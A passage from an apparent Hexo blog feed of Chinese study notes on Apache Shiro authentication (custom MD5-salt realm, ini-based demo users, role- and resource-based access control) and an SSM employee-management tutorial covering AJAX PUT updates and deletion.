class="number">23</span><span class="keyword">c</span><span class="number">533</span>fcf<span class="number">633</span></span><br></pre></td></tr></table></figure></p>
<p>创建一个CustomerMd5Realm<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.realm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationException</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationToken</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">SimpleAuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.<span class="type">AuthorizationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.<span class="type">AuthorizingRealm</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.<span class="type">PrincipalCollection</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.<span class="type">ByteSource</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用自定义realm 加入md5 + salt +hash</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">CustomerMd5Realm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthorizationInfo</span> doGetAuthorizationInfo(<span class="type">PrincipalCollection</span> principalCollection) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthenticationInfo</span> doGetAuthenticationInfo(<span class="type">AuthenticationToken</span> authenticationToken) <span class="keyword">throws</span> <span class="type">AuthenticationException</span> &#123;</span><br><span class="line">        <span class="comment">//获取身份信息</span></span><br><span class="line">        <span class="type">String</span> principal = (<span class="type">String</span>)authenticationToken.getPrincipal();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        if("xiaochen".equals(principal))&#123;</span></span><br><span class="line"><span class="comment">//            return new SimpleAuthenticationInfo(principal,</span></span><br><span class="line"><span class="comment">//                    "202cb962ac59075b964b07152d234b70",</span></span><br><span class="line"><span class="comment">//                    this.getName());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//参数1 数据库用户名  参数2 数据库md5+salt之后的密码 参数3 注册时的随机盐 参数4 realm的名字</span></span><br><span class="line"><span class="comment">//        if("xiaochen".equals(principal))&#123;</span></span><br><span class="line"><span class="comment">//            return new SimpleAuthenticationInfo(principal,</span></span><br><span class="line"><span class="comment">//                    "8a83592a02263bfe6752b2b5b03a4799",</span></span><br><span class="line"><span class="comment">//                    ByteSource.Util.bytes("X0*7ps"),</span></span><br><span class="line"><span class="comment">//                    this.getName());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"xiaochen"</span>.equals(principal))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="type">SimpleAuthenticationInfo</span>(principal,</span><br><span class="line">                    <span class="string">"e4f9bf3e0c58f045e62c23c533fcf633"</span>,</span><br><span class="line">                    <span class="type">ByteSource</span>.<span class="type">Util</span>.bytes(<span class="string">"X0*7ps"</span>),</span><br><span class="line">                    <span class="keyword">this</span>.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里就直接用md5 + salt + hash来演示了</p>
<p>再创建TestCustomerMd5RealmAuthenticator类<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">package com.ceit;</span><br><span class="line"></span><br><span class="line">import com.ceit.realm.CustomerMd5Realm;</span><br><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.AuthenticationException;</span><br><span class="line">import org.apache.shiro.authc.IncorrectCredentialsException;</span><br><span class="line">import org.apache.shiro.authc.UnknownAccountException;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.authc.credential.HashedCredentialsMatcher;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> TestCustomerMd5RealmAuthenticator &#123;</span><br><span class="line">    public static void main(String<span class="literal">[]</span> args) &#123;</span><br><span class="line">        <span class="comment">//创建安全管理器</span></span><br><span class="line">        DefaultSecurityManager defaultSecurityManager = <span class="keyword">new</span> <span class="constructor">DefaultSecurityManager()</span>;</span><br><span class="line">        <span class="comment">//注入realm</span></span><br><span class="line">        CustomerMd5Realm realm = <span class="keyword">new</span> <span class="constructor">CustomerMd5Realm()</span>;</span><br><span class="line">        <span class="comment">//设置realm使用hash凭证匹配器</span></span><br><span class="line">        HashedCredentialsMatcher credentialsMatcher = <span class="keyword">new</span> <span class="constructor">HashedCredentialsMatcher()</span>;</span><br><span class="line">        <span class="comment">//使用算法</span></span><br><span class="line">        credentialsMatcher.set<span class="constructor">HashAlgorithmName(<span class="string">"md5"</span>)</span>;</span><br><span class="line">        <span class="comment">//散列次数</span></span><br><span class="line">        credentialsMatcher.set<span class="constructor">HashIterations(1024)</span>;</span><br><span class="line">        realm.set<span class="constructor">CredentialsMatcher(<span class="params">credentialsMatcher</span>)</span>;</span><br><span class="line"></span><br><span class="line">        defaultSecurityManager.set<span class="constructor">Realm(<span class="params">realm</span>)</span>;</span><br><span class="line">        <span class="comment">//通过安全工具类获取subject</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>set<span class="constructor">SecurityManager(<span class="params">defaultSecurityManager</span>)</span>;</span><br><span class="line">        <span class="comment">//通过安全工具类获取subject</span></span><br><span class="line">        Subject subject = <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>get<span class="constructor">Subject()</span>;</span><br><span class="line">        <span class="comment">//创建token</span></span><br><span class="line">        UsernamePasswordToken token = <span class="keyword">new</span> <span class="constructor">UsernamePasswordToken(<span class="string">"xiaochen"</span>, <span class="string">"123"</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"登录成功"</span>);</span><br><span class="line">        &#125; catch (UnknownAccountException e) &#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"用户名错误"</span>);</span><br><span class="line">        &#125;catch (IncorrectCredentialsException e)&#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"密码错误"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">登录成功</span><br></pre></td></tr></table></figure></p>
<p>这样一个md5+salt+hash的认证就完成了</p>
<p>到这里shiro的认证就基本完成了</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro-2020/11/16-用户认证</title>
    <url>/2020/11/16/Shiro-2020-11-16-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="第一个程序用户认证"><a href="#第一个程序用户认证" class="headerlink" title="第一个程序用户认证"></a>第一个程序用户认证</h1><h2 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h2><p>由于现在还不需要整合到SSM中，所以直接创建maven的quickstart就可以了</p>
<p>引入相关依赖，并且调整一下Java的目录结构</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>还需要引入shiro的配置文件，配置文件后缀为<code>.ini</code>结尾的文件  shiro对名字和位置没有过于严格的要求  只需要放在当前项目下的任意位置即可  </p>
<p>在整合了Spring boot后，是不需要这个配置文件的 只是在学习过程中使用</p>
<p>shiro.ini<br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[users]</span></span><br><span class="line"><span class="attr">xiaochen</span>=<span class="number">123</span></span><br><span class="line"><span class="attr">zhangsan</span>=<span class="number">123456</span></span><br><span class="line"><span class="attr">lisi</span>=<span class="number">789</span></span><br></pre></td></tr></table></figure><br>[users]是写死的，后面的数据必须以键值对的方式来写</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ol>
<li><p>创建安全管理器对象</p>
</li>
<li><p>给安全管理器设置realm</p>
</li>
<li><p>SecurityUtils 给全局安全工具类设置安全管理器</p>
</li>
<li><p>关键对象  subject 主体</p>
</li>
<li><p>创建令牌</p>
</li>
</ol>
<p>创建一个TestAuthenticator类<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">package com.ceit;</span><br><span class="line"></span><br><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.mgt.SecurityManager;</span><br><span class="line">import org.apache.shiro.realm.text.IniRealm;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> TestAuthenticator &#123;</span><br><span class="line">    public static void main(String<span class="literal">[]</span> args) &#123;</span><br><span class="line">        <span class="comment">//1. 创建安全管理器对象</span></span><br><span class="line">        DefaultSecurityManager securityManager = <span class="keyword">new</span> <span class="constructor">DefaultSecurityManager()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 给安全管理器设置realm</span></span><br><span class="line">        securityManager.set<span class="constructor">Realm(<span class="params">new</span> IniRealm(<span class="string">"classpath:shiro.ini"</span>)</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. SecurityUtils 给全局安全工具类设置安全管理器</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>set<span class="constructor">SecurityManager(<span class="params">securityManager</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. 关键对象  subject 主体</span></span><br><span class="line">        Subject subject = <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>get<span class="constructor">Subject()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5. 创建令牌</span></span><br><span class="line">        UsernamePasswordToken token = <span class="keyword">new</span> <span class="constructor">UsernamePasswordToken(<span class="string">"xiaochen"</span>,<span class="string">"123"</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"认证状态："</span>+subject.is<span class="constructor">Authenticated()</span>);</span><br><span class="line">            subject.login(token); <span class="comment">//用户认证</span></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"认证状态："</span>+subject.is<span class="constructor">Authenticated()</span>);</span><br><span class="line">        &#125;catch (UnknownAccountException e)&#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"用户名不存在"</span>);</span><br><span class="line">        &#125;catch (IncorrectCredentialsException e)&#123;</span><br><span class="line">            e.print<span class="constructor">StackTrace()</span>;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"密码错误"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里踩了一个坑 提示了报错<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">SLF4J</span>: <span class="selector-tag">Failed</span> <span class="selector-tag">to</span> <span class="selector-tag">load</span> <span class="selector-tag">class</span> "<span class="selector-tag">org</span><span class="selector-class">.slf4j</span><span class="selector-class">.impl</span><span class="selector-class">.StaticLoggerBinder</span></span><br></pre></td></tr></table></figure><br>查了一下只需要maven引入依赖即可<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>正常认证通过的话，是不会有异常抛出的<br>运行结果<br><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">认证状态：<span class="literal">false</span></span><br><span class="line">认证状态：<span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
<p>如果没有认证通过<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.shiro</span><span class="selector-class">.authc</span><span class="selector-class">.UnknownAccountException</span></span><br></pre></td></tr></table></figure><br>则会直接抛出这样的异常  异常的意思就是用户名不存在</p>
<p>如果是用户名正确而密码不正确就会抛出<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.shiro</span><span class="selector-class">.authc</span><span class="selector-class">.IncorrectCredentialsException</span></span><br></pre></td></tr></table></figure><br>这异常就是密码错误</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro-2020/11/11-基础概念</title>
    <url>/2020/11/11/Shiro-2020-11-11-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h1><ul>
<li><p>学习目标</p>
<ol>
<li><p>基于url权限管理和shiro基础</p>
</li>
<li><p>shiro与企业web项目整合开发的方法</p>
</li>
</ol>
</li>
<li><p>权限管理</p>
<ol>
<li><p>用户认证</p>
</li>
<li><p>用户授权</p>
</li>
</ol>
</li>
<li><p>shiro基础</p>
<ol>
<li><p>shiro架构</p>
</li>
<li><p>shiro进行用户认证的方法</p>
</li>
<li><p>shiro进行用户授权的方法</p>
</li>
</ol>
</li>
</ul>
<h2 id="什么是权限管理"><a href="#什么是权限管理" class="headerlink" title="什么是权限管理"></a>什么是权限管理</h2><p>只要有用户参与的系统，一般都需要有权限管理，权限管理实现对用户访问系统的控制，按照安全规则或者安全策略控制用户可以访问而且只能访问自己被授权的资源</p>
<p>分为用户认证和授权两部分</p>
<h3 id="用户认证"><a href="#用户认证" class="headerlink" title="用户认证"></a>用户认证</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>用户去访问系统，系统要验证用户身份的合法性，最常用的用户身份验证的方法：</p>
<ol>
<li><p>用户名密码</p>
</li>
<li><p>指纹打卡机</p>
</li>
<li><p>基于证书的验证方法…</p>
</li>
</ol>
<p>系统验证用户身份合法，用户方可访问系统的资源</p>
<h4 id="关键对象"><a href="#关键对象" class="headerlink" title="关键对象"></a>关键对象</h4><ul>
<li><p>subject:主体 理解为用户，可能是程序，都要去访问系统的资源，系统需要对subject进行身份认证</p>
</li>
<li><p>principal:身份信息，通常是唯一的，一个主体还有多个身份信息，但是都有一个主身份信息(primary principal)</p>
</li>
<li><p>credential:凭证信息，可以是密码，证书，指纹</p>
</li>
</ul>
<p>总体：主体在进行身份认证时需要提供身份信息和凭证信息</p>
<h3 id="用户授权"><a href="#用户授权" class="headerlink" title="用户授权"></a>用户授权</h3><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><p>简单理解为访问控制，在用户认证通过后，系统对用户访问资源进行控制，用户具有资源的访问权限方可访问</p>
<h4 id="关键对象-1"><a href="#关键对象-1" class="headerlink" title="关键对象"></a>关键对象</h4><ul>
<li><p>授权的过程理解为：who对what(which)进行how操作</p>
</li>
<li><p>who:主体即subject，subject在认证通过后系统进行访问控制</p>
</li>
<li><p>what(which):资源(Resource)，subject必须具备资源的访问权限方可访问该资源。资源比如：系统用户列表页面、商品修改菜单、商品id为001的商品信息</p>
<ul>
<li><p>资源分为资源类型和资源实例</p>
</li>
<li><p>系统的用户信息就是资源类型，相当于java类</p>
</li>
<li><p>系统中id为001的用户就是资源实例相当于new的java对象</p>
</li>
</ul>
</li>
<li><p>how:权限/许可(permission)，针对资源的权限或许可，subject具有permission，如何访问/操作需要定义permission，比如：用户添加、用户修改、商品删除</p>
</li>
</ul>
<h4 id="分配权限"><a href="#分配权限" class="headerlink" title="分配权限"></a>分配权限</h4><p>用户需要分配相应的权限才可访问相应的资源。权限是对于资源的操作许可</p>
<p>通常给用户分配资源权限需要将权限信息持久化，比如存储在关系数据库中</p>
<h4 id="权限控制-授权核心"><a href="#权限控制-授权核心" class="headerlink" title="权限控制(授权核心)"></a>权限控制(授权核心)</h4><p>基于角色的访问控制(RBAC-Role based access control)<br>比如：<br>系统角色包括：部门经理，总经理（角色针对用户来划分）</p>
<p>系统代码中实现：<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果该user是部门经理则可以访问if中的代码</span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(user.hasRole(<span class="string">'部门经理'</span>)</span></span>)&#123;</span><br><span class="line">	<span class="comment">//代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>问题：<br>角色针对人划分的，人作为用户在系统中属于活动内容，如果该角色可以访问的资源出现变更，需要修改你的代码了，比如：需求变更为部门经理和总经理都可以查看用户报表，代码改为<br><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">if(<span class="keyword">user</span>.hasRole(<span class="string">'部门经理'</span>)|| <span class="keyword">user</span>.hasRole(<span class="string">'总经理'</span>))&#123;</span><br><span class="line">	//代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>基于角色的访问控制是不利于系统维护的(可拓展性不强)</p>
<p>基于资源的访问控制(RBAC-Resource based access control)<br>资源在系统中是不变的，比如资源有：类中的方法，页面中的按钮</p>
<p>对资源的访问需要具有permission权限，代码可以写为：<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(user.hasPermission(<span class="string">'用户报表查看'</span>)</span></span>)&#123;</span><br><span class="line">	<span class="comment">//代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这种方式可以解决用户角色变更不用修改权限控制的代码</p>
<p>如果需要变更权限只需要在分配权限模块去操作，给部门经理或总经理增或删除权限</p>
<p>所以建议使用基于资源的访问控制</p>
<h2 id="权限管理解决方案"><a href="#权限管理解决方案" class="headerlink" title="权限管理解决方案"></a>权限管理解决方案</h2><h3 id="什么是粗粒度和细粒度权限"><a href="#什么是粗粒度和细粒度权限" class="headerlink" title="什么是粗粒度和细粒度权限"></a>什么是粗粒度和细粒度权限</h3><ul>
<li><p>粗粒度：对资源类型的权限管理</p>
<ul>
<li><p>资源类型：菜单,url链接,用户添加页面,用户信息,类方法,页面中按钮</p>
</li>
<li><p>比如：超级管理员可以访问用户添加页面，用户信息等全部页面；部门管理员可以访问用户信息页面</p>
</li>
</ul>
</li>
<li><p>细粒度：对资源实例的权限管理，数据级别的权限管理</p>
<ul>
<li><p>资源实例：就是资源类型的具体化，比如：用户id为001的修改连接,1110班的用户信息,行政部的员工</p>
</li>
<li><p>部门经理只可以访问本部门的员工信息，用户只可以看到自己的菜单，大区经理只可以查看本辖区的销售订单</p>
</li>
</ul>
</li>
</ul>
<h3 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现"></a>如何实现</h3><h4 id="粗粒度"><a href="#粗粒度" class="headerlink" title="粗粒度"></a>粗粒度</h4><p>比较容易将权限管理的代码抽取出来在系统架构级别统一处理</p>
<p>比如：通过springmvc的拦截器实现授权</p>
<h4 id="细粒度"><a href="#细粒度" class="headerlink" title="细粒度"></a>细粒度</h4><p>在数据级别没有共性可言，针对细粒度权限管理就是业务逻辑的一部分，如果在业务层去处理相对比较简单，如果将细粒度权限管理统一在系统架构级别去抽取，比较困难，即使抽取的功能可能也存在扩展性不强</p>
<p>建议细粒度权限管理在业务层去控制</p>
<p>比如：部门经理只查询本部门员工信息，在service接口提供一个部门id的参数，controller中根据当前用户的信息得到该用户属于哪个部门，调用service将部门id传入service，实现该用户只查询本部门的员工</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>SSM-2020/10/21-员工管理系统-5</title>
    <url>/2020/10/21/SSM-2020-10-21-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="员工修改"><a href="#员工修改" class="headerlink" title="员工修改"></a>员工修改</h1><h2 id="更新信息"><a href="#更新信息" class="headerlink" title="更新信息"></a>更新信息</h2><p>如果将请求直接改为PUT，就会发现数据无法修改，请求体中有数据但Employee封装不上</p>
<p>原因：</p>
<ul>
<li><p>tomcat:</p>
<ol>
<li><p>将请求体中的数据，封装一个map</p>
</li>
<li><p>request.getParameter(“empName”)就会从这个map中取值</p>
</li>
<li><p>SpringMVC封装POJO对象的时候，会把POJO种每个属性的值，request.getParamter(“email”);</p>
</li>
<li><p>Tomcat检测到PUT请求就不会封装请求体数据为map，只有POST请求才会封装请求体</p>
</li>
</ol>
</li>
</ul>
<p>解决办法：<br>使用SpringMVC提供的过滤器HttpPutFormContentFilter</p>
<p>它的作用，将请求体中的数据解析包装成一个map，request被重新包装,request.getParameter()被重写，就会从自己封装的map中取数据</p>
<p>在web.xml中添加过滤器<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">filter</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">filter</span>-<span class="type">name</span>&gt;HttpPutFormContentFilter&lt;/<span class="keyword">filter</span>-<span class="type">name</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">filter</span>-<span class="keyword">class</span>&gt;org.springframework.web.<span class="keyword">filter</span>.HttpPutFormContentFilter&lt;/<span class="keyword">filter</span>-<span class="keyword">class</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">filter</span>&gt;</span><br><span class="line">&lt;<span class="keyword">filter</span>-<span class="keyword">mapping</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">filter</span>-<span class="type">name</span>&gt;HttpPutFormContentFilter&lt;/<span class="keyword">filter</span>-<span class="type">name</span>&gt;</span><br><span class="line">  &lt;url-pattern&gt;<span class="comment">/*&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="comment">&lt;/filter-mapping&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>index.jsp<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//点击更新，更新员工信息</span></span><br><span class="line">$(<span class="string">"#emp_update_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.验证邮箱是否合法</span></span><br><span class="line">    <span class="keyword">var</span> email = $(<span class="string">"#email_update_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regEmaill = <span class="regexp">/^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!regEmaill.test(email))&#123;</span><br><span class="line">        <span class="comment">// alert("邮箱格式不正确");</span></span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"error"</span>,<span class="string">"邮箱格式不正确"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"success"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2.发送ajax请求，保存更新的员工数据</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+$(<span class="keyword">this</span>).attr(<span class="string">"edit-id"</span>),</span><br><span class="line">        type:<span class="string">"PUT"</span>,</span><br><span class="line">        data:$(<span class="string">"#empUpdateModal form"</span>).serialize(),</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            alert(result.msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>现在就成功的更改了用户的数据</p>
<p>接下来就是完善这个更新逻辑，让其与之前的添加功能相同（关闭模态框，显示当前页）</p>
<p>定义一个全局变量currentPage，并在分页信息处赋值<br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">currentPage</span> = result.extend.pageInfo.pageNum<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>最后的编辑功能<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//点击更新，更新员工信息</span></span><br><span class="line">$(<span class="string">"#emp_update_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.验证邮箱是否合法</span></span><br><span class="line">    <span class="keyword">var</span> email = $(<span class="string">"#email_update_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regEmaill = <span class="regexp">/^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!regEmaill.test(email))&#123;</span><br><span class="line">        <span class="comment">// alert("邮箱格式不正确");</span></span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"error"</span>,<span class="string">"邮箱格式不正确"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"success"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2.发送ajax请求，保存更新的员工数据</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+$(<span class="keyword">this</span>).attr(<span class="string">"edit-id"</span>),</span><br><span class="line">        type:<span class="string">"PUT"</span>,</span><br><span class="line">        data:$(<span class="string">"#empUpdateModal form"</span>).serialize(),</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//alert(result.msg);</span></span><br><span class="line">            <span class="comment">//1.关闭模态框</span></span><br><span class="line">            $(<span class="string">"#empUpdateModal"</span>).modal(<span class="string">"hide"</span>);</span><br><span class="line">            <span class="comment">//2.回到本页面</span></span><br><span class="line">            to_page(currentPage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h1 id="员工删除"><a href="#员工删除" class="headerlink" title="员工删除"></a>员工删除</h1><p>效果图：<br><img src="/img/JavaWeb/10-21学习日记/0.png" alt="avatar"></p>
<p>我们想要实现的功能就是两种，第一种是单项删除，第二种就是选中然后一键删除</p>
<p>逻辑：</p>
<ol>
<li>单个删除<ul>
<li>URI：/emp{id} DELETE</li>
</ul>
</li>
</ol>
<h2 id="单个删除"><a href="#单个删除" class="headerlink" title="单个删除"></a>单个删除</h2><p>和之前的编辑差不多</p>
